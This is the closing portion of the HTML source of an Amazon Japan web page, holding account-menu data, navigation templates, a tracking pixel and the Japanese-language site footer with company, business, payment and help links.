href='https://www.amazon.co.jp/gp/browse.html?node=5695748051&ref_=nav_AccountFlyout_ab_yadd' class='nav-link nav-item'><span class='nav-text'>Amazonビジネス (法人購買・請求書払い・法人割引)</span></a> <a href='https://www.amazon.co.jp/hz/mycd/myx?ref_=nav_AccountFlyout_myk' class='nav-link nav-item'><span class='nav-text'>コンテンツと端末の管理</span></a> <a href='https://www.amazon.co.jp/gp/browse.html?node=3589137051&ref_=nav_AccountFlyout_pmu' class='nav-link nav-item'><span class='nav-text'>Prime Music</span></a> <a href='https://www.amazon.co.jp/gp/dmusic/mp3/player?ref_=nav_AccountFlyout_cldplyr' class='nav-link nav-item'><span class='nav-text'>ミュージックライブラリにアクセス</span></a> <a href='https://www.amazon.co.jp/clouddrive?ref_=nav_AccountFlyout_clddrv' class='nav-link nav-item'><span class='nav-text'>お客様のAmazon Drive</span></a> <a href='https://www.amazon.co.jp/gp/video/mystuff/watchlist?ref_=nav_AccountFlyout_ywl' class='nav-link nav-item'><span class='nav-text'>ウォッチリスト</span></a> <a href='https://www.amazon.co.jp/gp/video/mystuff/library?ref_=nav_AccountFlyout_yvl' class='nav-link nav-item'><span class='nav-text'>ビデオの購入とレンタル</span></a> <a href='https://www.amazon.co.jp/gp/kindle/ku/ku_central?ref_=nav_AccountFlyout_ku' class='nav-link nav-item'><span class='nav-text'>お客様の Kindle Unlimited</span></a> <a href='https://www.amazon.co.jp/kindle-dbs/library/manga?ref_=nav_AccountFlyout_mlibrary_yaccount' class='nav-link nav-item'><span class='nav-text'>マンガ本棚</span></a> <a href='https://www.amazon.co.jp/gp/swvgdtt/your-account/manage-downloads.html?ref_=nav_AccountFlyout_gsl' class='nav-link nav-item'><span class='nav-text'>ゲーム&PCソフトダウンロードライブラリ</span></a> <a href='https://www.amazon.co.jp/gp/mas/your-account/myapps?ref_=nav_AccountFlyout_aad' class='nav-link nav-item'><span class='nav-text'>アプリライブラリとデバイスの管理</span></a> <a id='nav-item-switch-account' href='https://www.amazon.co.jp/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fgp%2Fyourstore%2Fhome%2F%3Fie%3DUTF8%26ref_%3Dnav_youraccount_switchacct&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=jpflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&switch_account=picker&ignoreAuthState=1&_encoding=UTF8' class='nav-link nav-item'><span class='nav-text'>アカウントの切り替え</span></a> <a id='nav-item-signout' href='/' class='nav-link nav-item'><span class='nav-text'>ログアウト</span></a></div></div>"},
      "signinContent":{"html":"<div id='nav-signin-tooltip'><a href='https://www.amazon.co.jp/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fcpe%2Fyourpayments%2Fwallet%2F%3F_encoding%3DUTF8%26ref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=jpflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&' class='nav-action-button' data-nav-role='signin' data-nav-ref='nav_custrec_signin'><span class='nav-action-inner'>ログイン</span></a><div class='nav-signin-tooltip-footer'>初めてご利用ですか? <a href='https://www.amazon.co.jp/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fcpe%2Fyourpayments%2Fwallet%2F%3F_encoding%3DUTF8%26ref_%3Dnav_custrec_newcust&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=jpflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&' class='nav-a'>新規登録はこちら</a></div></div>"},
      "templates":{"itemList":"<# var hasColumns = (function () {  var checkColumns = function (_items) {    if (!_items) {      return false;    }    for (var i=0; i<_items.length; i++) {      if (_items[i].columnBreak || (_items[i].items && checkColumns(_items[i].items))) {        return true;      }    }    return false;  };  return checkColumns(items);}()); #><# if(hasColumns) { #>  <# if(items[0].image && items[0].image.src) { #>    <div class='nav-column nav-column-first nav-column-image'>  <# } else if (items[0].greeting) { #>    <div class='nav-column nav-column-first nav-column-greeting'>  <# } else { #>    <div class='nav-column nav-column-first'>  <# } #><# } #><# var renderItems = function(items) { #>  <# jQuery.each(items, function (i, item) { #>    <# if(hasColumns && item.columnBreak) { #>      <# if(item.image && item.image.src) { #>        </div><div class='nav-column nav-column-notfirst nav-column-break nav-column-image'>      <# } else if (item.greeting) { #>        </div><div class='nav-column nav-column-notfirst nav-column-break nav-column-greeting'>      <# } else { #>        </div><div class='nav-column nav-column-notfirst nav-column-break'>      <# } #>    <# } #>    <# if(item.dividerBefore) { #>      <div class='nav-divider'></div>    <# } #>    <# if(item.text || item.content) { #>      <# if(item.url) { #>        <a href='<#=item.url #>' class='nav-link      <# } else {#>        <span class='      <# } #>      <# if(item.panelKey) { #>        nav-hasPanel      <# } #>      <# if(item.items) { #>        nav-title      <# } #>      <# if(item.decorate == 'carat') { #>        nav-carat      <# } #>      <# if(item.decorate == 'nav-action-button') { #>        nav-action-button      <# } #>      nav-item'      <# if(item.extra) { #>        <#=item.extra #>      <# } #>      <# if(item.id) { #>        id='<#=item.id #>'      <# } #>      <# if(item.dataNavRole) { #>        data-nav-role='<#=item.dataNavRole #>'      <# } #>      <# if(item.dataNavRef) { #>        data-nav-ref='<#=item.dataNavRef #>'      <# } #>      <# if(item.panelKey) { #>        data-nav-panelkey='<#=item.panelKey #>'        role='navigation'        aria-label='<#=item.text#>'      <# } #>      <# if(item.subtextKey) { #>        data-nav-subtextkey='<#=item.subtextKey #>'      <# } #>      <# if(item.image && item.image.height > 16) { #>        style='line-height:<#=item.image.height #>px;'      <# } #>      >      <# if(item.decorate == 'carat') { #>        <i class='nav-icon'></i>      <# } #>      <# if(item.image && item.image.src) { #>        <img class='nav-image' src='<#=item.image.src #>' style='height:<#=item.image.height #>px; width:<#=item.image.width #>px;' />      <# } #>      <# if(item.text) { #>        <span class='nav-text<# if(item.classname) { #> <#=item.classname #><# } #>'><#=item.text#><# if(item.badgeText) { #>          <span class='nav-badge'><#=item.badgeText#></span>        <# } #></span>      <# } else if (item.content) { #>        <span class='nav-content'><# jQuery.each(item.content, function (j, cItem) { #><# if(cItem.url && cItem.text) { #><a href='<#=cItem.url #>' class='nav-a'><#=cItem.text #></a><# } else if (cItem.text) { #><#=cItem.text#><# } #><# }); #></span>      <# } #>      <# if(item.subtext) { #>        <span class='nav-subtext'><#=item.subtext #></span>      <# } #>      <# if(item.url) { #>        </a>      <# } else {#>        </span>      <# } #>    <# } #>    <# if(item.image && item.image.src) { #>      <# if(item.url) { #>        <a href='<#=item.url #>'>       <# } #>      <img class='nav-image'      <# if(item.id) { #>        id='<#=item.id #>'      <# } #>      src='<#=item.image.src #>' <# if (item.alt) { #> alt='<#= item.alt #>'<# } #>/>      <# if(item.url) { #>        </a>       <# } #>    <# } #>    <# if(item.items) { #>      <div class='nav-panel'> <# renderItems(item.items); #> </div>    <# } #>  <# }); #><# }; #><# renderItems(items); #><# if(hasColumns) { #>  </div><# } #>","subnav":"<# if (obj && obj.type === 'vertical') { #>  <# jQuery.each(obj.rows, function (i, row) { #>    <# if (row.flyoutElement === 'button') { #>      <div class='nav_sv_fo_v_button'        <# if (row.elementStyle) { #>          style='<#= row.elementStyle #>'        <# } #>      >        <a href='<#=row.url #>' class='nav-action-button nav-sprite'>          <#=row.text #>        </a>      </div>    <# } else if (row.flyoutElement === 'list' && row.list) { #>      <# jQuery.each(row.list, function (j, list) { #>        <div class='nav_sv_fo_v_column <#=(j === 0) ? 'nav_sv_fo_v_first' : '' #>'>          <ul class='<#=list.elementClass #>'>          <# jQuery.each(list.linkList, function (k, link) { #>            <# if (k === 0) { link.elementClass += ' nav_sv_fo_v_first'; } #>            <li class='<#=link.elementClass #>'>              <# if (link.url) { #>                <a href='<#=link.url #>' class='nav_a'><#=link.text #></a>              <# } else { #>                <span class='nav_sv_fo_v_span'><#=link.text #></span>              <# } #>            </li>          <# }); #>          </ul>        </div>      <# }); #>    <# } else if (row.flyoutElement === 'link') { #>      <# if (row.topSpacer) { #>        <div class='nav_sv_fo_v_clear'></div>      <# } #>      <div class='<#=row.elementClass #>'>        <a href='<#=row.url #>' class='nav_sv_fo_v_lmargin nav_a'>          <#=row.text #>        </a>      </div>    <# } #>  <# }); #><# } else if (obj) { #>  <div class='nav_sv_fo_scheduled'>    <#= obj #>  </div><# } #>","htmlList":"<# jQuery.each(items, function (i, item) { #>  <div class='nav-item'>    <#=item #>  </div><# }); #>"}
    })
  })
</script> 
  <script type="text/javascript">
  window.$Nav && $Nav.declare('config.flyoutURL', null);
  window.$Nav && $Nav.declare('btf.lite');
  window.$Nav && $Nav.declare('btf.full');
  window.$Nav && $Nav.declare('btf.exists');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).register('navCF');
</script> 
  <!-- NAVYAAN BTF END --> 
  <!-- btf tilu --> 
  <!-- sp:feature:host-btf --> 
  <!-- sp:end-feature:host-btf --> 
  <!-- sp:feature:aui-preload --> 
  <!-- sp:feature:nav-footer --> 
  <!-- footer pilu --> 
  <div class="navLeftFooter nav-sprite-v1" id="navFooter">
   <a href="#nav-top" id="navBackToTop">
    <div class="navFooterBackToTop">
     <span class="navFooterBackToTopText">トップへ戻る</span>
    </div></a> 
   <div class="navFooterVerticalColumn navAccessibility" role="presentation">
    <div class="navFooterVerticalRow navAccessibility" style="display: table-row;">
     <div class="navFooterLinkCol navAccessibility">
      <div class="navFooterColHead">
       Amazonについて
      </div>
      <ul>
       <li class="nav_first"><a href="https://www.amazon.co.jp/b?ie=UTF8&amp;node=236032011&amp;ref_=footer_gw_m_b_careers" class="nav_a">採用情報</a></li>
       <li><a href="https://blog.aboutamazon.jp/?utm_source=gateway&amp;utm_medium=footer" class="nav_a">Amazonについて</a></li>
       <li><a href="https://amazon-press.jp" class="nav_a">プレスリリース</a></li>
       <li><a href="https://www.amazon.co.jp/Amazon%E3%81%AE%E7%92%B0%E5%A2%83%E3%81%B8%E3%81%AE%E5%8F%96%E3%82%8A%E7%B5%84%E3%81%BF-%E4%BC%81%E6%A5%AD%E8%B2%AC%E4%BB%BB/b?ie=UTF8&amp;node=2038754051&amp;ref_=footer_corpres" class="nav_a">Amazonと地球</a></li>
       <li class="nav_last"><a href="https://www.amazon.co.jp/b?ie=UTF8&amp;node=2761807051&amp;ref_=footer_gw_m_b_ourcomm" class="nav_a">Amazonのコミュニティ活動</a></li>
      </ul>
     </div>
     <div class="navFooterColSpacerInner navAccessibility"></div>
     <div class="navFooterLinkCol navAccessibility">
      <div class="navFooterColHead">
       Amazonでビジネス
      </div>
      <ul>
       <li class="nav_first"><a href="https://www.amazon.co.jp/gpredirect.html?_encoding=UTF8&amp;location=https%3A%2F%2Fservices.amazon.co.jp%2Fselldot.html%3Fld%3DAZJPSOAFOOT%26ref_%3Dfooter_soa&amp;source=standards&amp;token=E6C1E2E5E93F8E51B1AB8E0F1D681A6827237696" class="nav_a">Amazonで売る</a></li>
       <li><a href="https://services.amazon.co.jp/services/fulfillment-by-amazon/merit.html?ld=AZJFBAFooter" class="nav_a">フルフィルメント by Amazon</a></li>
       <li><a href="https://services.amazon.co.jp/services/amazon-business.html?ld=AZJPB2BFOOT" class="nav_a">Amazonビジネスで法人販売</a></li>
       <li><a href="https://pay.amazon.com/jp/merchant?ld=AZJPAPAFooter" class="nav_a">Amazon Pay（決済サービス）</a></li>
       <li><a href="https://affiliate.amazon.co.jp/" class="nav_a">アソシエイト（アフィリエイト）</a></li>
       <li><a href="https://advertising.amazon.co.jp/?ref_=footer_ad" class="nav_a">Amazonで広告掲載をする</a></li>
       <li><a href="https://kdp.amazon.co.jp/?ref=footer_publishing" class="nav_a">Amazonで出版</a></li>
       <li class="nav_last nav_a_carat"><span class="nav_a_carat">›</span><a href="https://www.amazon.co.jp/b/?_encoding=UTF8&amp;ld=AZJPSOAMM&amp;node=2293760051&amp;ref_=footer_seeall" class="nav_a">すべてのサービスを見る</a></li>
      </ul>
     </div>
     <div class="navFooterColSpacerInner navAccessibility"></div>
     <div class="navFooterLinkCol navAccessibility">
      <div class="navFooterColHead">
       Amazonでのお支払い
      </div>
      <ul>
       <li class="nav_first"><a href="https://www.amazon.co.jp/Amazon%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88/b?ie=UTF8&amp;node=2632478051&amp;ref_=footer_point" class="nav_a">Amazonポイント</a></li>
       <li><a href="https://www.amazon.co.jp/gpgc?ie=UTF8&amp;ref_=footer_gc" class="nav_a">Amazonギフト券</a></li>
       <li><a href="https://www.amazon.co.jp/MasterCard_%E3%83%9E%E3%82%B9%E3%82%BF%E3%83%BC%E3%82%AB%E3%83%BC%E3%83%89_/b?ie=UTF8&amp;node=3036192051&amp;plattr=JBCBCCFT&amp;ref_=footer_pay_jp_cbcc" class="nav_a">Amazon Mastercard</a></li>
       <li><a href="https://www.amazon.co.jp/%E3%82%AF%E3%83%AC%E3%82%B8%E3%83%83%E3%83%88%E3%82%AB%E3%83%BC%E3%83%89/b?ie=UTF8&amp;node=2113286051&amp;plattr=JBCCMPFT&amp;ref_=footer_pay_jp_ccmp" class="nav_a">クレジットカード＆保険</a></li>
       <li><a href="https://www.amazon.co.jp/gp/shopwithpoints/marketing.html/?ie=UTF8&amp;inc=swpjcb&amp;pr=swpjcb" class="nav_a">パートナーポイントプログラム</a></li>
       <li><a href="https://www.amazon.co.jp/gpgc/create/?ie=UTF8&amp;ref_=footer_topup_jp" class="nav_a">Amazonギフト券チャージタイプ</a></li>
       <li class="nav_last nav_a_carat"><span class="nav_a_carat">›</span><a href="https://www.amazon.co.jp/gphelp/customer/display.html?ie=UTF8&amp;nodeId=642946&amp;ref_=footer_paymenthelp" class="nav_a">すべての支払い方法を見る</a></li>
      </ul>
     </div>
     <div class="navFooterColSpacerInner navAccessibility"></div>
     <div class="navFooterLinkCol navAccessibility">
      <div class="navFooterColHead">
       ヘルプ＆ガイド
      </div>
      <ul>
       <li class="nav_first"><a href="https://www.amazon.co.jp/gphelp/customer/display.html?ie=UTF8&amp;nodeId=GDFU3JS5AL6SYHRD&amp;ref_=footer_covid" class="nav_a">新型コロナウイルス関連</a></li>
       <li><a href="https://www.amazon.co.jp/gphelp/customer/display.html?ie=UTF8&amp;nodeId=642982&amp;ref_=footer_shiprates" class="nav_a">配送料と配送情報</a></li>
       <li><a href="https://www.amazon.co.jp/gpsubs/primeclub/signup/main.html?ie=UTF8&amp;ref_=footer_prime" class="nav_a">Amazon プライム</a></li>
       <li><a href="https://www.amazon.co.jp/gpcss/returns/homepage.html?ie=UTF8&amp;ref_=footer_returns" class="nav_a">商品の返品・交換</a></li>
       <li><a href="https://www.amazon.co.jp/hz/mycd/myx?_encoding=UTF8&amp;ref_=footer_myk" class="nav_a">コンテンツと端末の管理</a></li>
       <li><a href="https://www.amazon.co.jp/gpBIT/ref=footer_bit_v2_j0012?bitCampaignCode=j0012" class="nav_a">Amazonアシスタント</a></li>
       <li class="nav_last"><a href="https://www.amazon.co.jp/gphelp/customer/display.html?ie=UTF8&amp;nodeId=508510&amp;ref_=footer_help" class="nav_a">ヘルプ</a></li>
      </ul>
     </div>
    </div>
   </div>
   <div class="nav-footer-line"></div> 
   <div class="navFooterLine navFooterLinkLine navFooterPadItemLine">
    <span>
     <div class="navFooterLine navFooterLogoLine">
      <a href="https://www.amazon.co.jp/ref=footer_logo">
       <div class="nav-logo-base nav-sprite"></div></a>
     </div> </span>
    <ul></ul>
    <span class="icp-container-desktop">
     <div class="navFooterLine"> 
      <style type="text/css">
  #icp-touch-link-language { display: none; }
</style> 
      <a href="https://www.amazon.co.jp/gpcustomer-preferences/select-language/ref=footer_lang?ie=UTF8&amp;preferencesReturnUrl=%2F" class="icp-button a-declarative" id="icp-touch-link-language"> 
       <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">日本語</span><span class="nav-arrow icp-up-down-arrow"></span><span class="aok-hidden" style="display:none">ショッピングのための言語を選択します。</span> </a> 
      <style type="text/css">
#icp-touch-link-country { display: none; }
</style> 
      <a href="https://www.amazon.co.jp/gpnavigation-country/select-country/ref=footer_icp_cp?ie=UTF8&amp;preferencesReturnUrl=%2F" class="icp-button a-declarative" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-jp"></span><span class="icp-color-base">日本</span><span class="aok-hidden" style="display:none">ショッピングのための国/地域を選択します。</span> </a> 
     </div> </span>
    <ul></ul>
   </div> 
   <div class="navFooterLine navFooterLinkLine navFooterDescLine" role="navigation" aria-label="More on Amazon.com">
    <table class="navFooterMoreOnAmazon" cellspacing="0">
     <tbody>
      <tr> 
       <td class="navFooterDescItem"><a href="https://advertising.amazon.co.jp/?ref=footer_advtsing_2_jp" class="nav_a">Amazon Advertising<br /> <span class="navFooterDescText">商品の露出でお客様の関心と<br /> 反応を引き出す</span></a></td> 
       <td class="navFooterDescSpacer" style="width: 1%"></td> 
       <td class="navFooterDescItem"><a href="https://www.audible.co.jp/?source_code=AMAAMZWPCPC090815000C" class="nav_a">Audible（オーディブル）<br /> <span class="navFooterDescText">本は、聴こう。<br /> 最初の1冊は無料</span></a></td> 
       <td class="navFooterDescSpacer" style="width: 1%"></td> 
       <td class="navFooterDescItem"><a href="https://aws.amazon.com/jp/?sc_channel=EL&amp;sc_campaign=JP_amazonfooter" class="nav_a">アマゾン ウェブ サービス（AWS）<br /> <span class="navFooterDescText">クラウドコンピューティング<br /> サービス</span></a></td> 
       <td class="navFooterDescSpacer" style="width: 1%"></td> 
       <td class="navFooterDescItem"><a href="https://www.amazon.co.jp/b?ie=UTF8&amp;node=2761990051&amp;ref_=footer_wrhsdls" class="nav_a">Amazonアウトレット<br /> <span class="navFooterDescText">訳あり商品を<br /> お手頃価格で販売</span></a></td> 
       <td class="navFooterDescSpacer" style="width: 1%"></td> 
       <td class="navFooterDescItem"><a href="https://www.amazon.co.jp/primenow/?ref=HOUD12C322_0_GlobalFooter" class="nav_a">Prime Now<br /> <span class="navFooterDescText">好きな時間が選べる。<br /> 最短2時間で届く</span></a></td> 
      </tr> 
      <tr>
       <td>&nbsp;</td>
      </tr> 
      <tr> 
       <td class="navFooterDescItem"><a href="https://www.amazon.co.jp/b?ie=UTF8&amp;node=5695748051&amp;ref_=JP_AB_ONS_GW_FOO" class="nav_a">Amazonビジネス（法人購買）<br /> <span class="navFooterDescText">請求書払い<br /> 法人価格・数量割引</span></a></td> 
       <td class="navFooterDescSpacer" style="width: 1%"></td> 
       <td class="navFooterDescItem"><a href="https://www.amazon.co.jp/AmazonGlobal-AmazonJapan/b?ie=UTF8&amp;node=3534638051&amp;ref_=footer_amazonglobal" class="nav_a">AmazonGlobal<br /> <span class="navFooterDescText">65か国/地域以上への<br /> 海外配送がより簡単に</span></a></td> 
       <td class="navFooterDescSpacer" style="width: 1%"></td> 
       <td class="navFooterDescItem"><a href="https://www.bookdepository.com/" class="nav_a">Book Depository<br /> <span class="navFooterDescText">送料無料で<br /> 世界中にお届け</span></a></td> 
       <td class="navFooterDescSpacer" style="width: 1%"></td> 
       <td class="navFooterDescItem"><a href="https://www.shopbop.com/jp/welcome" class="nav_a">Shopbop<br /> <span class="navFooterDescText">世界中の厳選された<br /> ファッションアイテム</span></a></td> 
       <td class="navFooterDescSpacer" style="width: 1%"></td> 
       <td class="navFooterDescItem"><a href="https://www.amazon.co.jp/amazonsecondchance?_encoding=UTF8&amp;ref_=footer_asc" class="nav_a">Amazon Second Chance <br /> <span class="navFooterDescText"> 譲ったり、下取りに出したりして有効活用。</span></a></td> 
      </tr> 
     </tbody>
    </table>
   </div> 
   <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright navFooterLineDivider">
    <ul>
     <li class="nav_first"><a href="https://www.amazon.co.jp/gphelp/customer/display.html?ie=UTF8&amp;nodeId=643006&amp;ref_=footer_cou" class="nav_a">利用規約</a></li>
     <li><a href="https://www.amazon.co.jp/gphelp/customer/display.html?ie=UTF8&amp;nodeId=643000&amp;ref_=footer_privacy" class="nav_a">プライバシー規約</a></li>
     <li class="nav_last"><a href="https://www.amazon.co.jp/gphelp/customer/display.html?ie=UTF8&amp;nodeId=201047280&amp;ref_=footer_iba" class="nav_a">パーソナライズド広告規約</a></li>
    </ul>
    <span>&copy; 1996-2021, Amazon.com, Inc. or its affiliates</span>
    <ul></ul>
   </div> 
  </div>
  <!-- whfh-sTgBmZLmGJpRQmAKiDZtEqrmRIPkteTlrHv70lLNQnBQVv6fBet194MCRE/2ACaZ rid-ABYH9FRFKN9A5GZM8DBC --> 
  <div id="sis_pixel_r2" aria-hidden="true" style="height:1px; position: absolute; left: -1000000px; top: -1000000px;">
   <!-- footer tilu --> 
   <!-- sp:feature:amazon-pay-iframe --> 
   <!-- sp:end-feature:amazon-pay-iframe --> 
   
   <noscript> 
    <img height="1" width="1" style="display:none;visibility:hidden;" src="//fls-fe.amazon.co.jp/1/batch/1/OP/A1VC38T7YXB528:357-2533609-2718458:ABYH9FRFKN9A5GZM8DBC$uedata=s:%2Frd%2Fuedata%3Fnoscript%26id%3DABYH9FRFKN9A5GZM8DBC:0" alt="" /> 
   </noscript> 
  </div> 
  <!--       _
       .__(.)< (MEOW)
        \___)   
 ~~~~~~~~~~~~~~~~~~--> 
  <!-- sp:eh:+E6tbN4zW8TrOIDo9NPxr9k2O91G6QKbRL25ikgmPgVE+/8fF0+JPeALZijIDfRszM7Tl/waoMCrAUF77XPtcZgp8bypRySccIBqgtRNSBRmNNJoV4KXX7zJj9s= --> 
  
 </body>
</html>